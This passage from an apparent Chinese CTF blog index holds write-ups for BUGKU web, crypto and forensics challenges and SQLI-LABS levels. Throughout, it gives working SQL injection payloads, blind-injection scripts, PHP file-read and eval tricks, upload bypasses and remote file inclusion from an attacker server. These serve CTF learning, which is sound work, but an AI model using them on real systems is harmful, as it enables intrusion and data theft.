'sDGucEcgR9ixzDNVm6IrpA%3D%3D' # 填写未修改过的ivcipher = 'SjeC+xtTva24pYSPdWXIsm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9' # 填写提示反序列化错误的字符串cipher = base64.b64decode(cipher).decode('unicode_escape')print('cipher:',cipher)iv = base64.b64decode(urllib.parse.unquote(iv))iv = iv.decode('unicode_escape')newIv = ''right = 'a:2:&#123;s:8:\"userna' # 被损坏前正确的明文for i in range(16): newIv += chr( ord(right[i]) ^ ord(iv[i]) ^ ord(cipher[i])) print(urllib.parse.quote(base64.b64encode(newIv.encode('latin-1')))) 将得到的iv替换cookie中的iv，刷新一下页面即可以admin身份登录获取flag。","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/%E8%B5%84%E6%96%99/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"},{"name":"Crypto","slug":"Crypto","permalink":"http://chaosec.top/tags/Crypto/"}]},{"title":"BUGKU-CTF题解","slug":"bugkuwriteup","date":"2018-03-12T13:26:27.000Z","updated":"2019-01-30T11:44:07.782Z","comments":true,"path":"2018/03/12/bugkuwriteup/","link":"","permalink":"http://chaosec.top/2018/03/12/bugkuwriteup/","excerpt":"前言 最近一段时间课比较少，做一做bugku的题目。传送门","text":"前言 最近一段时间课比较少，做一做bugku的题目。传送门 杂项 签到题 加群即可 这是一张单纯的图片 hex一下之后得到 &#107;&#101;&#121;&#123;&#121;&#111;&#117;&#32;&#97;&#114;&#101;&#32;&#114;&#105;&#103;&#104;&#116;&#125; ，Unicode解码即可(我这个是被解码后的) 隐写 改变高度即可得到flag，将7对应的第二行A4改为F4即可。 telnet wireshark跑一下然后追踪tcp流即可 猜 google搜索图片可知那是刘亦菲(liuyifei)。 流量分析（cnss） 这个题目我觉得挺坑的，用wireshark分析一下，因为题目也没任何提示，而且包里面貌似是CSRF，所以就在往这上面想，但是也没什么收获，反正这题数据包少，就随手追踪了第一条碰碰运气，结果它的请求引起了我的注意： GET /stat.htm?id=2724999&amp;r=http%3A%2F%2Fspace.bilibili.com%2F17190571&amp;lg=zh-cn&amp;ntime=1490634009&amp;cnzz_eid=418561883-1487085537-http%3A%2F%2Fwww.bilibili.com%2F&amp;showp=1536x864&amp;p=http%3A%2F%2Fspace.bilibili.com%2F17190571%2F%23!%2F&amp;t=Chrstm%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4%20-%20%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9%20(%20%E3%82%9C-%20%E3%82%9C)%E3%81%A4%E3%83%AD%20%E4%B9%BE%E6%9D%AF~%20Bilibil…&amp;umuuid=15ab677e5a02ed-064c9a36304b67-27d1a36-144000-15ab677e5a4205b&amp;h=1&amp;rnd=1218637328 HTTP/1.1 请求网址里面有个space.bilibili.com ，感觉这应该是某个用户的个人空间，尝试访问一下，结果就在个人空间里个性签名看到了熟悉的base64，解码两次即可得到flag。 做个游戏(08067CTF) 下载之后是个游戏，直接二进制反编译一下，结果在PlaneGameFrame类里面找到了flag，记得flag还得再base64解码一下。 Web web2 直接查看元素即可 文件上传测试 burpsuite抓包将图片文件改名为2.png.php即可 计算器 直接计算即可，问题在于输入框只能输入以为数字，查看元素将最大长度改为3即可。 web基础$_GET payload ?what=flag web基础$_POST 1what&#x3D;flag 矛盾 用%00截断即可?num=1%00adf，原理是==比较时只是对值的比较，会把不同类型转为同类型之后再行比较 Web3 阻止页面弹窗后查看元素，然后Unicode解码即可 sql注入 查看元素发现是gb2312的编码，测试?id=1%df’则会报错，说明是宽字节注入，payload1?id&#x3D;1%df&#39; union select 1,string from sql5.key where id&#x3D;1--+ 域名解析 直接在linux下打开hosts文件，输入下列文档 120.24.86.145 flag.bugku.com 我在部分linux下不能用，不知道是为什么。 sql注入1 过滤了关键字，尝试用%00绕过1?id&#x3D;-1 uni%00on sele%00ct 1,hash fr%00om sql3.key wh%00ere id&#x3D;1--+ 你必须让他停下 页面一直停不下来，尝试了禁用js文件，还是不行，尝试burpsuite构造参数多次抓包，然后查看返回页面里则可以得到flag。 网站被黑 题目给出提示 这个题没技术含量但是实战中经常遇到 ,打开后发现也没有什么泄露的问题，所以猜测应该是后台弱口令之类的问题，扫描了一下目录，发现有个shell.php，是个后台马，尝试了几个弱口令都不行，最终尝试爆破了一下，得到密码。（提示一下密码是四位）。 本地包含 页面有代码泄露1234567 &lt;?php include \"waf.php\"; include \"flag.php\"; $a = @$_REQUEST['hello']; eval( \"var_dump($a);\"); show_source(__FILE__);?&gt; 方法一 变量request是一个http变量，可以接受post或者get和cookie的数组，代码中eval( “var_dump($a);”)存在可以利用的漏洞，可以把所要得到的文件dump出来。构造参数1?hello&#x3D;file_get_contents(&#39;flag.php&#39;)浏览器php代码被截断，f12查看元素即可得到flag 方法二 其中第一句话include “flag.php”可知文件包含在本地 还是利用 eval()函数，payload11);print_r(file(&quot;.&#x2F;flag.php&quot;));%23%23的作用是注释掉eval函数后面的“)形成闭合。 strcmp比较字符串 这个题目的问题在于PHP在5.3版本之前，对于字符串比较函数strcmp(p1,p2)函数，如果p1&gt;p2，返回&gt;0；如果p1=p2，返回=0；如果p1 &lt; p2，返回&#60;0。但是如果传递到参数是个数组，那么函数会报错，则会return 0，相当于判断为p1=p2了。故payload为?a[]=1。 变量1 本题考查可变变量，故payload为 ?args=GLOBALS，这里这个$$GLOBALS只能在eval中使用，却不能直接var_dump出来，不知道是为什么。 web5 jspfuck查看代码，直接将代码扔进控制台即可 头等舱 抓包查看请求头即可 管理员系统 修改xff本地登录，之后查看源代码发现最后一行有一段base64内容，解码之后是 test123 ，所以直接以这个作为密码登录试一下，然后就拿到了flag web4 查看源代码发现有url编码的文本，按照 eval(unescape(p1) + unescape(‘%35%34%61%61%32’ + p2));语句拼接url编码并转码可得12345678910function checkSubmit()&#123; var a&#x3D;document.getElementById(&quot;password&quot;); if(&quot;undefined&quot;!&#x3D;typeof a)&#123; if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;&#x3D;&#x3D;a.value)return!0; alert(&quot;Error&quot;); a.focus(); return!1 &#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit&#x3D;checkSubmit;查看代码可知将67d709b2b54aa2aa648cf6e87a7114f1提交即可。 flag在index里 查看元素发现有href=”./index.php?file=show.php语句，而题目又说flag在index里，所以应该是要查看index.php文件，burp抓包修改。payload file=php://filter/convert.base64-encode/resource=index.php 输入密码查看flag 简答的弱口令爆破，密码13579 点击一百万次 post参数为1000000即可 备份是个好习惯 题目说了备份，查看index.php.bak可以下载到源码1234567891011121314151617181920&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once \"flag.php\";ini_set(\"display_errors\", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag.\"取得flag\";&#125;?&gt;阅读代码可知，提交两个md5值相等而本身值不相等的变量即可，同时还有变量guolv，双写绕过即可，这里提一下，这儿的 REQUEST_URI的输入方式www.xxx.com/aaa/ ,那么aaa就是REQUEST_URI。本题payload /?kekeyy1[]=1&amp;kekeyy2[]=2/ 成绩单 常规的SQL注入12345id&#x3D;1&#39; order by 4%23 #爆字段数id&#x3D;-1&#39; union select 1,database(),3,4%23 #爆数据库名id&#x3D;-1&#39; union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D;database()%23 #爆表名id&#x3D;-1&#39; union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name&#x3D;&#39;fl4g&#39;%23 #爆字段名id&#x3D;-1&#39; union select 1,skctf_flag,3,4 from fl4g%23 秋名山老司机 这个题只能2秒内提交，所以写个脚本1234567891011121314import requestsimport reurl &#x3D; &quot;http:&#x2F;&#x2F;120.24.86.145:8002&#x2F;qiumingshan&#x2F;&quot;r &#x3D; requests.session()content &#x3D; r.get(url).textpar &#x3D; re.findall(r&#39;(.*?)&#x3D;.*?&#39;,content)text &#x3D; par[1][5:]ans &#x3D; eval(text)payload &#x3D; &#123;&#39;value&#39;:ans&#125;content &#x3D; r.post(url,data&#x3D;payload).textprint(content) 速度要快 这个题就是编程题，抓包就会发现有个flag值，被base64编码了，解之，然后查看元素 OK ,now you have to post the margin what you find 所以其实就是要提交margin值，但是这个题最骚的就是这个被base64解码后flag还需要在解码一次，也怪我，第一次解码后这个字符串倒是挺像base64的，怪我不够敏感，而且margin好像是css样式，应该解出数字才对。贴上代码123456789101112import requestsimport base64url = \"http://120.24.86.145:8002/web6/\"r = requests.session()content = r.get(url).headers['flag'].encode('utf-8')content = base64.b64decode(content)content = content.decode('utf-8')[15:]content = base64.b64decode(content)payload = &#123;'margin':content&#125;res = r.post(url,data=payload).textprint(res) COOKIE欺骗 解码filename发现是keys.txt，base64编码index.php替换之，然后改变line的参数即可得到全部php文件进行代码审计，改变cookie为margin=margin，再把filename的值为keys.php(要base64编码)，然后就OK了 XSS 这个题目是最简单的xss，所谓xss其实和sql注入差不多，这是xss用的是JavaScript语言，payload1?id&#x3D;src&#x3D;&quot;null&quot; onerror&#x3D;&quot;alert(_key_)&quot;\\u003e never give up 看到提示有1p.html，但是查看会跳转，用view-source查看即可，然后恢复代码123456789101112131415161718192021222324&lt;?phpif(!$_GET['id']) //$_GET['id']为空时执行该语句&#123; header('Location: hello.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'no no no no no no no'; return ;&#125;$data = @file_get_contents($a,'r');if($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)&gt;5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)&#123; require(\"f4l2a3g.txt\");&#125;else&#123; print \"never never never give up !!!\";&#125;?&gt;发现有个txt文件，不管别的，先看一下再说，结果直接出了flag，这应该是题目的漏洞。下面说正解查看代码，$a的绕过的话 a=php://input，然后postbugku is a nice plateform!，$id==0的绕过话可以用 id=%00绕过， strlen($b)&gt;5 and eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4的绕过可以用b=%00123456 参看PHP手册可以知道php://input是个可以访问请求的原始数据的只读流，一般用来获取POST请求。对于id的处理有代码可知，如果提交id=0，那么前面 $_GET[‘id’]会被判断为空，无法从而使代码exit。所以可以用id=00或者id=%00绕过(字符串0在PHP中会被当做空值)函数eregi()现已被弃用，存在%00截断漏洞，读到%00的时候，判断就截止了。 welcome to bugkuctf 访问元素发现源代码123456789$user = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $pass = $_GET[\"password\"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello admin!&lt;br&gt;\"; include($file); //hint.php &#125;else&#123; echo \"you are not admin ! \"; &#125;text的绕过可以使用php的input协议流，file的话用PHP的filter过滤器即可1?txt&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;hint.php读取到一段base64代码，解码得到PHP代码123456789101112&lt;?php class Flag&#123;&#x2F;&#x2F;flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&quot;); &#125; &#125; &#125; ?&gt;发现这是一个flag类，有个string方法，序列化即可使之执行。payload1?txt&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;hint.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 过狗一句话 查看源代码可知已经构造了assert语句，这个对于我来说是一个新知识点。assert和eval类似，可以进行命令执行，只是eval参数为字符串，而assert参数则为函数或表达式。构造命令来执行?s=var_dump(glob(‘*‘)) 函数glob(pattern，flag)可以匹配所有符合条件的文件 读取文件?s=var_dump(file(‘./flag.txt’)) 字符？正则？ 这个正则表达式后面我得好好学一下了，有点菜。靠着百度大概搞懂了，介绍一些 [[:punct:]]为匹配任意字符，非字母和数字，.*为匹配任意字符，{m,n}为匹配字符m-n次，按照要求构造payload 1?id&#x3D;key.keyaaaaakey:&#x2F;a&#x2F;keya% 前女友(SKCTF) 查看页面可知，是一段单身狗的诉说，查看元素发现竟然藏了一条链接，点击发现代码123456789101112&lt;?phpif(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123; $v1 &#x3D; $_GET[&#39;v1&#39;]; $v2 &#x3D; $_GET[&#39;v2&#39;]; $v3 &#x3D; $_GET[&#39;v3&#39;]; if($v1 !&#x3D; $v2 &amp;&amp; md5($v1) &#x3D;&#x3D; md5($v2))&#123; if(!strcmp($v3, $flag))&#123; echo $flag; &#125; &#125;&#125;?&gt; 很简单的绕过1?v1&#x3D;240610708&amp;v2&#x3D;QNKCDZO&amp;v3[]&#x3D;1 login1(SKCTF) 看提示可知本题是SQL约束攻击，具体原理查看传送门，创建一个用户 用户名 admin 1 密码 Aa123456 注册成功后用admin为用户名， Aa123456登录即可 1SKCTF&#123;4Dm1n_HaV3_GreAt_p0w3R&#125; 你从哪里来 题目提示are you from google?，我以为是说浏览器，但实际上是说HTTP_REFERER，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。然后就是抓包发送即可，构造的referrer：1https:&#x2F;&#x2F;www.google.com md5 collision 这题是简单的md5哈希的比较1?a&#x3D;240610708 各种绕过 这题很简单，直接上payload12?id&#x3D;margin&amp;uname[]&#x3D;1passwd[]&#x3D;123注意第二行为post数据。 web8 代码审计与绕过123456789101112131415&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo \"&lt;p&gt;This is flag:\" .\" $flag&lt;/p&gt;\";&#125;else&#123;echo \"&lt;p&gt;sorry!&lt;/p&gt;\";&#125;&#125;?&gt;要绕过的核心语句是$ac===$f，可以令 ac=flag，fn处使用之前说过的PHP的input协议，本题payload1?ac&#x3D;flag&amp;fn&#x3D;php:&#x2F;&#x2F;input再post数据1flag 细心 看了一点提示，有点不好。这题一看页面没什么东西，随便尝试旁站robots.txt(就是这一步我没有做，唉，经验不足啊),扫描发现有个resusl.php页面，直接是x=admin即可(考验脑洞的时刻) 求getshell 对于getshell的题目做的不是很多，真的是有点迷。抓包更改后缀为 php2,php4.php5，测试发现php5可用，然后再把文件类型改一下 content-type: image/jpg 还得改个东西 Content-Type: Multipart/form-data; boundary=—————————————-265001916915724 把第一个m大写，有关介绍看个链接,这种绕过有点冷门，再放个链接2 INSERT INTO注入 这个题又让我学到了新知识，还顺便加强了一波脚本编写，本题考察的是 insert into注入，为什么存在注入呢 查看源代码，发现1$ip_arr = explode(',', $ip); 这句话一出， 说明，就被过滤了，所以这题是一道不能使用逗号的注入，而且报错什么的都不行，所以只能延时盲注。由于本题逗号被过滤了，所以if函数不能用了，在此解锁一个新姿势12select substring((select user()) from 1 for 1); #第一种方法select substring((select user()) from -1); #第二种方法如此就可以不用逗号截取字符串 对于判断条件，可以使用1select case when (条件) then 代码1 else 代码 2 end这个前面数据库有介绍。所以对于本题有两种payload：12insert into xs values(12&#39;+(select case when binary substr((select flag from flag) from 1 for 1)&#x3D;&#39;e&#39; then sleep(5) else sleep(0) end) and &#39;a&#39;&#x3D;&#39;a&#39;)insert into xs values(12&#39;+(select case when binary substr((select flag from flag) from -1)&#x3D;&#39;e&#39; then sleep(5) else sleep(0) end) and &#39;a&#39;&#x3D;&#39;a&#39;) 再介绍一个绕过逗号的姿势： 1select id,ip from client_ip where 1&gt;2 union select * from ( (select user())a JOIN (select version())b ); --这个用于union 查询的注入 接下来就是写脚本了 1234567891011121314151617import requestsimport stringurl = \"http://120.24.86.145:8002/web15/\"data = \"12'+(select case when binary substr((select flag from flag) from &#123;&#125; for 1)='&#123;&#125;' then sleep(5) else 1 end) and 'a'='a\" flag = ''start = 1for i in range(1,35): for item in string.ascii_letters + string.digits: try: headers = &#123;\"x-forwarded-for\":data.format(str(start),item)&#125; res = requests.get(url,headers=headers,timeout=3) except requests.exceptions.ReadTimeout: flag += item start += 1 print(flag) break 这是一个神奇的登录框 尝试输入 “，发现有报错，可以报错注入。而且题目什么都没有过滤。 ed6b28e684817d9efcaf802979e57aeed6b28e684817d9efcaf802979e57aea1admin_name&#x3D;admin&amp;admin_passwd&#x3D;afd&quot; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1)%23 1admin_name&#x3D;admin&amp;admin_passwd&#x3D;afd&quot; and updatexml(1,concat(0x7e,(select flag1 from flag1),0x7e),1)%23 用这种方法的出来的flag不对，因为该错误返回的值长度不足，可以再用下列子句截出1admin_name&#x3D;admin&amp;admin_passwd&#x3D;afd&quot; and updatexml(1,concat(0x7e,substr((select flag1 from flag1),3,30),0x7e),1)%23 也可以联合注入1admin_name&#x3D;admin&amp;admin_passwd&#x3D;af&quot; union select flag1,2 from flag1%23 多次 这个题学到了新东西，题目很不错。这个题目过滤了许多关键字刚开始输入 ?id=1’页面返回错误(但不是报错信息)，添加 ?id=1’%23则没有报错，继续尝试 ?id=1’ and 1=1%23则又开始报错了，猜测可能是存在过滤，但不知道过滤的是什么。找到一个异或注入的方法 在id后面输入 1’^(0)^’，此时页面正常返回，如果换一下 ‘^(1)^’，此时则会返回错误，那么接下来我们就可以试一下页面究竟过滤了那些关键字。比如 1’^(length(‘select’)!=6)^’如果被过滤则返回错误，没有被过滤就返回正确。如此可以测得多个变量被过滤 select,union,or,and 但是from,where，order等变量没有被过滤。在尝试一下 1’^(length(‘selselectect’)!=6)^’页面返回正确，说明可以通过这种方法绕过。那接下里就开始常规操作。 12?id&#x3D;1&#39; oorrder by 3%23 # 爆字段数?id&#x3D;-1&#39; ununionion seleselectct 1,database() %23 注意information的绕过。1?id&#x3D;-1&#39; ununionion seleselectct 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema&#x3D;database()%23 最后得到下一个页面的地址1?id&#x3D;-1&#39; ununionion seleselectct 1,group_concat(address) from flag1%23 到了新页面之后，发现有报错，也会显示你的SQL语句，很简单就能看出很多都被过滤了，不过直接用报错就行了1?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)%23 看别人的payload使用了locate()函数 代码审计 strcmp比较字符串 提交数组即可绕过 ?a[]=1 数组返回NULL绕过 也是提交数组 ?password[]=123 ,因为题目中的函数都是只能处理字符串，如果传入的是数组则会报错返回 NULL达到绕过的效果。 变量覆盖 看代码可知，$c获取的是输入流里面的值，因为$b是字符串，所以获取的是控制，故只需要相应的输入空值即可。 简单的waf 没做出来，记录一下思路 题目代码如下 123456789101112131415161718192021222324252627$a=isset($_GET[\"a\"])?$_GET[\"a\"]:'';$b=isset($_GET[\"b\"])?$_GET[\"b\"]:'';$c=isset($_GET[\"c\"])?$_GET[\"c\"]:'';$d=isset($_GET[\"d\"])?$_GET[\"d\"]:'';$e=isset($_GET['e'])?$_GET['e']:'';if(preg_match('/php/i', $a))&#123; die(\"This not allow pseudo protocol!\");&#125;if(preg_match('/\\.\\./', $a))&#123; die(\"This also not allow!\");&#125;if((file_get_contents($a,'r')===$b)&amp;&amp;(file_get_contents($e,'r')===\"I'm Administrator!\"))&#123; echo \"hello admin!&lt;br&gt;\"; if(preg_match(\"/flag/\",$c))&#123; echo \"不能现在就给你flag哦\"; exit(); &#125;else&#123; include($c); if(preg_match('/base64/', $d))&#123; die(\"No! you can't use it!\"); &#125; $d = unserialize($d); echo $d; &#125; &#125;else&#123; echo \"you are not admin ! &lt;br&gt;\";&#125; 首先变量a中不能出现php://等字段，显示我们不能使用PHP伪协议，但是这里可以远程文件包含，我们可以在自己的vps上写一个文件，然后a参数远程包含，再让b参数等于我们的文本内容就可了，对于e参数我们同样可以利用远程文件包含，在自己的vps上新建一个txt文件写入 I&#39;m Administrator! 即可，payload如下 1http:&#x2F;&#x2F;120.24.86.145:9010?a&#x3D;http:&#x2F;&#x2F;vps_ip&#x2F;index.html&amp;b&#x3D;&lt;a&gt;Hello World&lt;&#x2F;a&gt;%0a&amp;e&#x3D;http:&#x2F;&#x2F;vps_ip&#x2F;a.txt 说一下坑点，在使用vim编辑文件的时候，他会默认在文件末尾添加一个换行符，这也是为什么b参数后面要添加一个 %0a(换行符) ，但是在e参数对应的代码中的 I&#39;m Administrator! 可是没有换行符的，怎么办呢？百度找到了一个方法： 1、进入vim前，增加-b参数1vim -b a.txt2、进入命令行模式，开启 set noeol这样就不会在文件末尾添加换行符了。 c参数和d参数个人感觉思路是c参数包含一个PHP文件，然后d参数反序列化读取，题目还有一个flag.php文件，所以c参数应该就是要包含该文件，题目过滤了flag，可以用大写绕过 Flag.php ，但是这里应该有一个类来反序列化才对，我感觉应该是通过文件泄露来获取，但是尝试了好多次都不行，直接访问flag，会下载到一个文件，信息为 please call admin to get flag 不知道这是什么意思，题目到这儿就卡住了，所以payload只有 1http:&#x2F;&#x2F;120.24.86.145:9010&#x2F;?a&#x3D;http:&#x2F;&#x2F;vps_ip&#x2F;index.html&amp;b&#x3D;&lt;a&gt;Hello%20World&lt;&#x2F;a&gt;%0a&amp;e&#x3D;http:&#x2F;&#x2F;vps_ip&#x2F;a.txt&amp;c&#x3D;Flag.php 加密 滴答 ~ 滴 摩斯解密可得bkctfmisc，提交即可,注意全部大写。 聪明的小羊 栅栏解密 ok 这段密文是一种ook语言，直接在线跑一下即可 这不是摩斯密码 brainfuck代码，在上一题那个网站跑一下即可。 散乱的密文 lf5{ag024c483549d7fd@@1}一张纸条上凌乱的写着2 1 6 5 3 4 刚开始看到{前面有三位以为明文应该是key，顺着这个思路往下想，结果不对，后面注意到密文的2，1两位翻转一下是fl，6，5两位加上就是flag，于是再把3,4位放到原来5,6位的位置，那么前六位就是 flag{5 ，我们可以看到前六位进行的调整分别是1，2位交换位置，5,6位交换到3,4位顺序不变，3,4位调整到5,6位但是位置交换一下，于是把每六位分成一组，每组按照前述的方法做变换，最终可以得到flag 1flag&#123;52048c453d794df1&#125;@@ 贝斯家族 base91解码 社工 密码 根据生日姓名等猜测zs19970315 王晓明的日记 利用bugku在线密码生成工具生成密码字典测试一下即可 分析 flag被盗 过滤条件 http contains &quot;flag&quot;，在第二条数据中即发现了flag 抓到一只苍蝇 首先查看一下http请求，在第一个就发现 本能的感觉这题和这个fly.rar应该有点关系，所以过滤一下 ‘http contains “fly.rar”‘ 看到了题目的提示内容，感觉走对了，这个包应该是QQ邮箱的包，所以肯定是走post请求的，过滤一下获取rar文件包 http.request.method == POST 可以看到从第二个到第六个正式rar的文件内容，但是这五个文件的总长度却比fly.rar要大，应该有多余的头部，计算一下头部长度 (527521bytes – 525701bytes) / 5 = 364 bytes 把每个一次导出，然后用hxd去掉头部364字节，之后再合并一下 可以看到md5值是正确的，证明我们得到了正确的fly.rar文件，但是解压时却要求输入密码，猜测是伪加密，将文件头0x1674后面的84改为80。（84为加密，80/20不加密），解密之后有个TXT文件，binwalk，foremost一下，在图片中找到一个二维码，扫码即可得到flag。 信息提取 给的数据包是sqlmap注入的一个数据包，题目的意思是让我们从sqlmap的payload中恢复出数据，数据包的最后部分就是数据的记录，吧这部分分出来保存为a.pcap，将关键信息存入txt文件中 123456789101112131415161718192021222324252627282930313233343536# import scapy# from scapy.all import *# from scapy.utils import PcapReader# pcaps = rdpcap(\"a.pcap\")# file = open('1.txt','wb')# for i in range(476):# file.write(pcaps[i]['Raw'].load)# 将流量包字段信息导出，之后在用sublime过滤只留下请求内容和response长度，示例如下# GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C34%2C1%29%29%3E1 HTTP/1.1# Content-Length: 166from urllib.parse import unquoteimport redef is_rigth(x): if int(x) &gt; 4: return True else: return False with open('1.txt','r') as file: ans = \"\" req = file.readlines() length = req[238:476] req = req[0:238] for i in range(len(req)//7 - 1): num = int(re.search('&gt;([0-9]&#123;2,&#125;)',unquote(req[i*7+6],'utf-8')).group(1)) if is_rigth(length[i*7+6][-3]): ans += chr(int(num+1)) else: ans += chr(int(num)) print(ans)# ISG&#123;BLind_SQl_InJEcTi0N_DeTEcTEd&#125;","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"SQLI-LABS(Less36-Less65)","slug":"sqli-labs3","date":"2018-03-05T13:41:22.000Z","updated":"2019-05-16T09:18:17.273Z","comments":true,"path":"2018/03/05/sqli-labs3/","link":"","permalink":"http://chaosec.top/2018/03/05/sqli-labs3/","excerpt":"接上篇","text":"接上篇 LESS-36 函数mysql\\_real\\_escape\\_string()转义SQL语句中使用的字符串中的特殊字符。下列字符受影响： \\x00\\n\\r\\‘“\\x1a 如果成功，则该函数返回被转义的字符串。如果失败，则返回false。 可以使用宽字节注入 1?id&#x3D;-1%df&#39; union select 1,database(),3--+ 在使用mysql_real_escape_string()函数时，想要避免这种问题，需要将mysql设置为gbk即可 LESS-37 和34关绕过一样，waf和36关差不多 1uname=admin♦' or 1=1 limit 3,1#&amp;passwd=admin&amp;submit=Submit 堆叠注入stacked injection 所谓堆叠注入，就是指多条SQL语句同时执行，在命令行中每个SQL语句都是以;结尾。虽然说union语句也可以执行两条select语句，区别在于union语句可以执行的语句有限，而堆叠注入可以执行任何语句。比如1select * from pruducts where id&#x3D;1;delete from products 堆叠注入的局限性在于并非每个环境都可以执行，受到环境的限制， LESS-38 本题明注盲注皆可以，明注payload1?id&#x3D;-1&#39; union select 1,group_concat(username),3 from users--+ 堆叠注入1?id&#x3D;-1&#39;;create table test like users--+可以看到数据库里面成功创建，然后再删除一下1?id&#x3D;-1&#39;;drop table test--+ LESS-39 payload1?id&#x3D;-1 union select 1,2,3--+ 也可堆叠注入 LESS-40 盲注payload1?id&#x3D;2&#39;) and ascii(substr(database(),1,1))&#x3D;115--+本题错误不回显，不能报错注入 LESS-41 和40关一样无法报错，可以和39关一样1?id&#x3D;-1;create table test like users--+多条命令执行。也可以注入1?id&#x3D;-1 union select 1,2,database()--+ LESS-42 本关mysqli_real_escape_string只过滤了username字段，对于password则没有过滤，payload1login_user&#x3D;admin&amp;login_password&#x3D;c&#39;;create table test like users# LESS-43 和42关一样，只是闭合方式不同1login_user&#x3D;admin&amp;login_password&#x3D;c&#39;) or 1&#x3D;1# LESS-44 和42关一样，只是没有报错无法盲注1login_user&#x3D;admin&amp;login_password&#x3D;c&#39; or 1&#x3D;1# LESS-45 1login_user&#x3D;admin&amp;login_password&#x3D;c&#39;) or 1&#x3D;1# 注意：这几关页面都在login.php页面，不在原页面。 LESS-46 本关是order by注入，尝试一下分号发现有报错，报错注入可以用一下1?sort&#x3D;2 and extractvalue(1,concat(0x3c,(select database())))看不到数据库名的话查看一下元素即可 对于这种问题有三种方法 1、直接添加注入语句 ?sort=(select \\*\\*\\*\\*\\*\\*)2、利用一些函数，例如rand函数，?sort=rand(sql语句)，而且此处rand(true)和rand(false)是不相同的。3、利用and，例如?sort=1 and (加sql语句) 还可以执行infile等命令上传一句话木马 LESS-47 本关只是闭合方式发生了变化，只能进行报错和延时注入 1234?sort&#x3D;1&#39; and extractvalue(1,concat(0x3c,(select database())))%23?sort&#x3D;1 and if(1&#x3D;1, sleep(1), null)?sort&#x3D;1&#39; and (length(database())) &#x3D; 8 and if(1&#x3D;1, sleep(1), null)%23?sort&#x3D;1&#39; and (ascii(substr((select database()) ,1,1))) &#x3D; 115 and if(1&#x3D;1, sleep(1), null)%23 LESS-48 这关没有报错回显，延时盲注即可1?sort&#x3D;1 and (length(database())) &#x3D; 8 and if(1&#x3D;1, sleep(1), null)%23 LESS-49 跟上关差不多只是闭合方式不同1?sort&#x3D;1&#39; and (length(database())) &#x3D; 8 and if(1&#x3D;1, sleep(1), null)%23 LESS-50 考察order by的堆叠注入1?sort&#x3D;1;create table test like users; LESS-51 闭合方式不同1?sort&#x3D;1&#39;;create table test like users--+ LESS-52 本题不报错，无法报错注入，依然可以堆叠注入1?sort&#x3D;1;create table test like users LESS-53 本关错误不能回显，但是可以和51关一样堆叠注入1?sort&#x3D;1&#39;;create table test like users--+ LESS-54 从本关开始进行更加进阶的注入，所用数据库也改为challenges，每个答案只能尝试10次，10次之后则会重置表名选项等信息。 由于已经知道数据库名，所以可以直接开始爆表名1?id&#x3D;-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()--+ 得到表名 utj0xhedjp(你的和我的不一样，是随机的)，接下来爆列名1?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;utj0xhedjp&#39;--+ 得到id,sessid,secret_W2TD,tryy，得到字段1?id&#x3D;-1&#39; union select 1,secret_W2TD,3 from utj0xhedjp--+得到vYPh8AlkQMTlEGkZXRKWo1PT，提交即可。 LESS-55 本关限制次数为14次，主要是前面尝试闭合，这个找出来后面就简单了1?id&#x3D;1)%23 爆表名1?id&#x3D;-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()%23 jq0p5t7r1m 爆列名1?id&#x3D;-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;jq0p5t7r1m&#39;%23 id,sessid,secret_3JXI,tryy 